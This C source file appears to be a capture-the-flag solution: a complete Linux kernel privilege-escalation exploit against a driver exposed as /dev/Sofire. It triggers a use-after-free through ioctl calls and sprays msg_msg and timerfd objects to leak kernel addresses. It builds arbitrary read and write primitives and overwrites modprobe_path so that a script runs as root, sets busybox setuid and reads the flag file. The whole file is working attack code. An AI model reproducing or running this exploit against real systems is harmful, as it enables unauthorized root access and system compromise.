#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/msg.h>
#include <string.h>
#include <sys/timerfd.h>
#include <sys/ioctl.h>
#include <sys/wait.h>



#define CHUNK_SIZE 0x100
#define MSG_SIZE 128 - 48
#define MSG_SPRAY_SIZE 0x10 

int sofire_fd;
int msqid[MSG_SPRAY_SIZE];
char val[0x10];
int verbose = 1;

#define debug_print(...)    do { if ( verbose) {printf(__VA_ARGS__);} \
} while (0)

#define input() do { printf("INPUT: "); gets(&val); } while (0)

unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state(){
    __asm__(
            ".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;"
           );
    puts("[*] Saved state");
}

typedef struct request{
    int idx;
    char buffer[CHUNK_SIZE];
} request;


typedef struct msg_msg_msg {
    long mtype;
    char mtext[MSG_SIZE];
} msg_msg_msg;

long alloc(char *data){
    struct request req ={ 
        1, *(char*)data
    };
    memcpy(req.buffer, data, CHUNK_SIZE );
    return ioctl(sofire_fd, 0xdeadbeef,&req);
}

char * _read(int idx){
    struct request req;
    char* ret ;
    req.idx = idx;
    ioctl(sofire_fd, 0xcafebabe,&req);
    ret = malloc(sizeof(req.buffer));
    memcpy(ret, req.buffer, sizeof(req.buffer));
    for(int i=0; i<32; i++){
        printf("[+] Arb read leak %d: %p\n", i, ((void **)req.buffer)[i]);
    }


    return ret;
}

void _write(int idx, char * value){
    struct request req;
    req.idx = idx;
    memcpy(req.buffer, value, sizeof(req.buffer));
    ioctl(sofire_fd, 0xbabecafe,&req);
}

void leet(){
    debug_print("[+] LEET Called\n");

    // UAF FREEEEEEE
    struct request req ={ 
        1337, "DOES NOT MATTER"
    };
    ioctl(sofire_fd, 0x1337, &req);
}


void leak_kernel(){
    // Entire function needs to happen between free frame, 2 ioctl's
    puts("[+] STARTING EXPLOIT");
    // Prepare structures
    struct msg_msg_msg msg;
    msg.mtype = 1;
    memset(msg.mtext, 0x42, MSG_SIZE - 1);
    msg.mtext[MSG_SIZE] = 0;

    for(int i =0; i < MSG_SPRAY_SIZE; i ++){
        // Post message - allocate msg_msg
        msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        msgsnd(msqid[i], &msg, sizeof(msg.mtext) - sizeof(long), 0);
    }
    struct request req ={ 
        1337, "DOES NOT MATTER"
    };

    ioctl(sofire_fd, 0xdeadbeef, &req);

    puts("Waiting");
    wait(NULL); // Wait for the race to finish

    ioctl(sofire_fd, 1, &req);

    for(int i =0; i < MSG_SPRAY_SIZE; i ++){
        // Post message - allocate msg_msg
        if(msgrcv(msqid[i], &msg, sizeof(msg.mtext) - sizeof(long), 1, IPC_NOWAIT ) < 0)
            puts("msgrcv error");
    }
    puts("Spraying done");
    puts("EXPLOIT DONE, EXITING");
}


void spray_msg_msg(char *data){
    struct msg_msg_msg msg;
    msg.mtype = 1;

    memcpy(msg.mtext, data, sizeof(msg.mtext));

    msg.mtext[MSG_SIZE] = 0;

    for(int i =0; i < MSG_SPRAY_SIZE; i ++){
        msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        msgsnd(msqid[i], &msg, sizeof(msg.mtext) - sizeof(long), 0);
    }
}

void release_msg_msg(){
    puts("[+] Releasing Msg_msg Buffers");
    struct msg_msg_msg msg;
    for(int i =0; i < MSG_SPRAY_SIZE; i ++){
        // Post message - allocate msg_msg
        if(msgrcv(msqid[i], &msg, sizeof(msg.mtext), 1, IPC_NOWAIT ) < 0){
            puts("msgrcv error");
            exit(0);
        }
    }
}

unsigned long long leak_heap(){
    // Prepare structure
    struct msg_msg_msg msg;
    msg.mtype = 1;
    memset(msg.mtext, 0, MSG_SIZE);
    int msqid[MSG_SPRAY_SIZE];
    puts("[+] Spraying msg_msg");
    for(int i =0; i < MSG_SPRAY_SIZE; i ++){
        // Post message - allocate msg_msg
        msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        msgsnd(msqid[i], &msg, sizeof(msg.mtext), 0);
    }

    puts("[+] Create new chunk");
    // Alloc this to see it later 
    alloc("HI");

    puts("[+] Read/Freeing msg_msg");
    for(int i =0; i < MSG_SPRAY_SIZE; i ++){
        // Rcv message - free's msg_msg
        if(msgrcv(msqid[i], &msg, sizeof(msg.mtext), 1, IPC_NOWAIT ) < 0){
            puts("msgrcv error");
            exit(0);
        }
        if(((unsigned long long**)msg.mtext)[8]!=0){
            return ((unsigned long long*)msg.mtext)[8];
        }
    }
    puts("[-] No leak found");
    exit(1);
}

unsigned long long arb_read(unsigned long long addr){
    unsigned long long* payload[0x100];
    char leaks[0x100];
    unsigned long long return_leaks[0x100];

    memset(payload, 0, 0x65);

    // 56 more?
    payload[8] = addr - 8;

    spray_msg_msg((char *)&payload);
    memcpy(leaks, _read(0), 0x100);
    /* printf("LEAKED: 0x%llx\n", *(unsigned long long*)leaks); */

    return *(unsigned long long*)leaks;
}

void arb_write(unsigned long long addr, char * value){
    debug_print("[+] WRITING %s TO 0x%llx\n", value, addr);
    unsigned long long* payload[0x100];
    char leaks[0x100];
    unsigned long long return_leaks[0x100];

    memset(payload, 0, 0x65);
    /* payload[8] = (unsigned long long*)addr -8 ; */
    payload[8] = addr -8 ;
    spray_msg_msg((char *)&payload);
    _write(0, value); 
}

unsigned long long* arb_read2(unsigned long long addr){
    leet();
    arb_read(addr-8);
}

int create_timer(int leak)
{
    struct itimerspec its;

    its.it_interval.tv_sec = 0;
    its.it_interval.tv_nsec = 0;
    its.it_value.tv_sec = 10;
    its.it_value.tv_nsec = 0;

    int tfd = timerfd_create(CLOCK_REALTIME, 0);
    timerfd_settime(tfd, 0, &its, 0);

    if (leak)
    {
        close(tfd);
        sleep(1);
        return 0;
    }
}


int main(int argc, char *argv[])
{
    unsigned long ret;
    unsigned long long leaks; 
    sofire_fd = open("/dev/Sofire", O_RDONLY);
    system("echo -e '#!/bin/sh\nchmod 777 /flag.txt\nchmod u+s /bin/busybox\nchmod o+t /bin/\n' > /tmp/xxxx && chmod +x /tmp/xxxx && echo -e '\\xff\\xff\\xff\\xff' > /tmp/dummy && chmod +x /tmp/dummy");


    alloc("FIRST CHUNK");
    _read(0);

    // Spray timers around first chunk
    for (int i = 0; i < 0x100; i++) {
        create_timer(0);
    }

    // Free things + Trigger UAF to get leak
    leet();
    unsigned long long heap_leak = leak_heap();
    debug_print("[+] Kernel heap leak: 0x%llx\n", heap_leak);

    /* leaks = (unsigned long long)arb_read(heap_leak); */
    debug_print("[+] Attempting to read: 0x%llx\n", heap_leak+2064+48);

    leaks = (unsigned long long)arb_read(heap_leak+2064+48);
    if (leaks == 0){
        puts("LEAK FAILED");
        return 1;
    }


    // Offsets
    /* const unsigned long long timer_offset = 22499639; */
    const unsigned long long timer_offset = 19035936;
    const unsigned long long init_task_offset = 25250240;

    unsigned long long kernel_base = leaks - timer_offset;

    debug_print("[+] KERNEL BASE: 0x%llx\n[+] OG_LEAK 0x%llx\n", kernel_base, leaks);

    int modprobe_offset = 25498624;
    /* int modprobe_offset = 0xffffffff91251440 - 0xffffffff8fa00000; */
    debug_print("[+] Attempting to read: 0x%llx\n", kernel_base + modprobe_offset);


    leet();
    arb_write(kernel_base + modprobe_offset, "/tmp/xxxx");

    debug_print("[+] Creating mystery binary + Creating /tmp/xxxx to trigger modprobe\n");
    system("echo -e '#!/bin/sh\nchmod 777 /flag.txt\nchmod u+s /bin/busybox\nchmod o+t /bin/\n' > /tmp/xxxx && chmod +x /tmp/xxxx && echo -e '\\xff\\xff\\xff\\xff' > /tmp/dummy && chmod +x /tmp/dummy && /tmp/dummy");
    system("ls -la /flag.txt");
    system("cat /flag.txt");
    return 0;
}
